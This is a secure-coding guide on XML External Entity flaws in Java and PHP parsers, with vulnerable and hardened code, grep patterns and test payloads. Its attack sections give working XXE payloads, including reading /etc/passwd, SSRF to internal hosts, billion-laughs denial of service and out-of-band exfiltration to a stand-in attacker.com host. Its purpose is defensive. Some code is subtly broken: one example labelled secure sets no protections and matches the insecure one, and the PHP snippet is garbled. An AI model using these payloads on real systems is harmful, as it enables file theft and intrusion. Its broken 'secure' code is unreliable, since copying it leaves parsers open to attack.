# XML External Entity (XXE) (CWE-611)

**Severity**: 🔴 CRITICAL
**Category**: Input Validation & Representation
**OWASP Top 10**: A05:2021 – Security Misconfiguration

---

## Overview

### Attack Description

XML documents can contain DTDs (Document Type Definitions), and DTDs define XML entities. The XML External Entity (XXE) vulnerability can occur when the server is configured to process XML external entities. Attackers can use XXE to read arbitrary files, perform SSRF attacks, cause denial of service, and in some cases achieve remote code execution.

### Impact

When a vulnerable XML parser processes XML values that reference external values, attack statements inserted by an attacker can execute, resulting in server file access, resource consumption, authentication bypass, and information disclosure.

**Potential consequences:**
- File disclosure (read `/etc/passwd`, config files, source code)
- Server-Side Request Forgery (SSRF)
- Denial of Service (billion laughs attack)
- Remote code execution (in some configurations)
- Port scanning of internal network
- Information disclosure

---

## Security Measures

### Key Principles

Configure the system to use local static DTDs, and completely disable DTDs contained in externally transmitted XML documents. If disabling is not possible, disable external entities and external document type declarations using the unique method for each parser.

**Primary Defenses:**

1. **Disable External Entities**
   - Disable DTD processing entirely (safest)
   - Disable external entity expansion
   - Disable external parameter entities
   - Disable XInclude processing

2. **Use Safe Parser Configuration**
   - Configure XML parser securely
   - Set features to disable dangerous functionality
   - Use modern parsers with secure defaults

3. **Input Validation**
   - Validate XML against XSD schema
   - Whitelist allowed elements/attributes
   - Reject XML with DOCTYPE declarations

4. **Use Safe Libraries**
   - JAXB with secure configuration
   - SAXParser with features disabled
   - Modern libraries (Jackson, Gson for JSON instead)

---

## Code Examples

### Attack Scenario

The following example is source code that reads and parses an XML source. If an attacker sends receivedXML data that references XML external entities as shown below, the /etc/passwd file can be accessed when it is parsed.

**XXE Attack Payload:**
```xml
receivedXML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

When parsed, the `&xxe;` entity is replaced with contents of `/etc/passwd`.

**Other Attack Variations:**

```xml
<!-- Read local files -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- SSRF attack -->
<!ENTITY xxe SYSTEM "http://internal-server/admin">

<!-- Parameter entity attack (bypass filtering) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- Billion Laughs (DoS) -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
...
```

---

### ❌ Vulnerable Code

#### Java - JAXB Without Secure Configuration

```java
public void unmarshal(File receivedXml)
throws JAXBException, ParserConfigurationException, SAXException, IOException {
    JAXBContext jaxbContext = JAXBContext.newInstance( Student.class );
    Unmarshaller jaxbUnmarshaller = jaxbContext.createUnmarshaller();
    // Create a Document using the received receivedXml
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setNamespaceAware(true);
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document document = db.parse(receivedXml);
    // Performing unmarshalling using a document that may contain external entities
    // is unsafe
    Student employee = (Student) jaxbUnmarshaller.unmarshal( document );
}
```

**Problems:**
1. DocumentBuilderFactory with default settings
2. No DTD/external entity processing disabled
3. Accepts any XML with external entities
4. Can read arbitrary files on server

**Attack Result:**
If `receivedXml` contains XXE payload, the parser will:
1. Process the DOCTYPE declaration
2. Fetch content from `file:///etc/passwd`
3. Include it in the parsed document
4. Expose sensitive files to attacker

---

### ✅ Secure Code

#### Java - SAX Parser with Secure Configuration

```java
import javax.xml.parsers.SAXParsers;
import javax.xml.parsers.SAXParserFactory;

class XXE {
    public static void main(String[] args)
    throws FileNotFoundException, ParserConfigurationException, SAXException,
    IOException {

        SAXParserFactory factory = SAXParserFactory.newInstance();
        SAXParser saxParser = factory.newSAXParser();
        // Reading secure.xml file without external entity restriction settings is unsafe
        saxParser.parse(new FileInputStream("secure.xml"), new DefaultHandler());
    }
}
```

**Secure Configuration:**

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser saxParser = factory.newSAXParser();
// Reading secure.xml file with external entity restriction settings is safe
saxParser.parse(new FileInputStream("secure.xml"), new DefaultHandler());
}
```

---

#### ✅ Java - DocumentBuilderFactory Secure Configuration

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Configure XML parser to disallow DOCTYPE definitions
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Disable all external general entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// Disable all external parameter entities
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// Disable external DTD loading
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
// Disable XInclude usage
dbf.setXIncludeAware(false);
// Prevent the created parser from expanding entity reference nodes
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(receivedXml);
Model model = (Model) u.unmarshal(document);
```

**Security Features:**
1. **Disallow DOCTYPE** - Most important, blocks all DTD processing
2. **Disable external general entities** - Prevents file:// access
3. **Disable external parameter entities** - Prevents parameter entity attacks
4. **Disable external DTD loading** - Prevents remote DTD fetches
5. **Disable XInclude** - Prevents XInclude-based attacks
6. **Don't expand entity references** - Extra safety

---

#### ✅ Complete Secure Example

```java
public class SecureXMLParser {

    public static Document parseXMLSafely(InputStream xmlInput)
            throws ParserConfigurationException, SAXException, IOException {

        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        // CRITICAL: Disable all dangerous features
        try {
            // 1. Disallow DOCTYPE declarations (strongest protection)
            dbf.setFeature(
                "http://apache.org/xml/features/disallow-doctype-decl", true);

            // 2. Disable external general entities
            dbf.setFeature(
                "http://xml.org/sax/features/external-general-entities", false);

            // 3. Disable external parameter entities
            dbf.setFeature(
                "http://xml.org/sax/features/external-parameter-entities", false);

            // 4. Disable external DTD loading
            dbf.setFeature(
                "http://apache.org/xml/features/nonvalidating/load-external-dtd",
                false);

            // 5. Disable XInclude processing
            dbf.setXIncludeAware(false);

            // 6. Don't expand entity references
            dbf.setExpandEntityReferences(false);

        } catch (ParserConfigurationException e) {
            // If parser doesn't support these features, reject
            throw new ParserConfigurationException(
                "XML parser doesn't support required security features");
        }

        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(xmlInput);
    }
}
```

---

#### ✅ PHP - Disable External Entity Loading

```php
// In PHP, the libxml_disable_entity_loader function can be used to disable external entity usage

value = libxml_disable_entity_loader(true);
$dom =) loadXML($xml);
libxml_disable_entity_loader($value);
```

---

## References

### CWE (Common Weakness Enumeration)

① **CWE-611: Improper Restriction of XML External Entity Reference**
   MITRE, https://cwe.mitre.org/data/definitions/611.html

### OWASP

② **XML Entity Prevention Cheat Sheet**
   OWASP, https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

---

## 🔍 Detection Patterns (Grep/Search)

```bash
# Find XML parsing
grep -r "DocumentBuilderFactory" .
grep -r "SAXParserFactory" .
grep -r "XMLInputFactory" .
grep -r "unmarshal" .

# Find potentially vulnerable parsers
grep -r "DocumentBuilder.*parse" . | grep -v "setFeature"
grep -r "SAXParser.*parse" . | grep -v "setFeature"

# Check for secure configuration
grep -r "disallow-doctype-decl" .
grep -r "external-general-entities" .
```

---

## ✅ Security Checklist

- [ ] DOCTYPE declarations disabled (strongest protection)
- [ ] External general entities disabled
- [ ] External parameter entities disabled
- [ ] External DTD loading disabled
- [ ] XInclude processing disabled
- [ ] Entity reference expansion disabled
- [ ] All XML parsers configured securely
- [ ] Input validation against XSD schema
- [ ] XXE testing completed
- [ ] Regular security scanning for XXE

---

## 🎯 Parser-Specific Secure Configuration

### DocumentBuilderFactory (JAXP)

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### SAXParserFactory

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### XMLInputFactory (StAX)

```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### TransformerFactory

```java
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

### Unmarshaller (JAXB)

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),
                                  new InputSource(xmlInputStream));
JAXBContext jc = JAXBContext.newInstance(MyClass.class);
Unmarshaller um = jc.createUnmarshaller();
MyClass myClass = (MyClass) um.unmarshal(xmlSource);
```

---

## 🚨 Attack Techniques

### File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF (Server-Side Request Forgery)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>&xxe;</root>
```

### Denial of Service (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

Expands to millions of "lol" strings, causing memory exhaustion.

### Out-of-Band Data Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

evil.dtd:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

---

## 💡 Modern Alternatives

### Use JSON Instead of XML

```java
// Instead of XML parsing
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(jsonString, MyObject.class);
```

**Benefits:**
- No entity expansion
- No DTD processing
- Simpler parsing
- Better performance

### Use Protobuf, Avro, or Other Binary Formats

Modern serialization formats don't have XXE vulnerabilities.

---

## 🔬 Testing for XXE

### Basic XXE Test

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Blind XXE Test (Out-of-Band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/test">%xxe;]>
<root></root>
```

Check server logs at `attacker.com` for incoming request.

### Tools

- **Burp Suite**: XXE detection scanner
- **OWASP ZAP**: Automated XXE testing
- **XXEinjector**: Specialized XXE exploitation tool

---

## 💡 Best Practices Summary

1. **Disable DOCTYPE entirely** - Strongest protection
2. **Disable all external entity processing** - If DOCTYPE needed
3. **Use secure parser configuration** - Set all safety features
4. **Validate against XSD** - Schema validation
5. **Prefer JSON** - When possible, avoid XML
6. **Keep libraries updated** - Modern parsers have better defaults
7. **Test regularly** - Include XXE in security testing

---

**Always disable external entities in XML parsers - Or use JSON instead!**
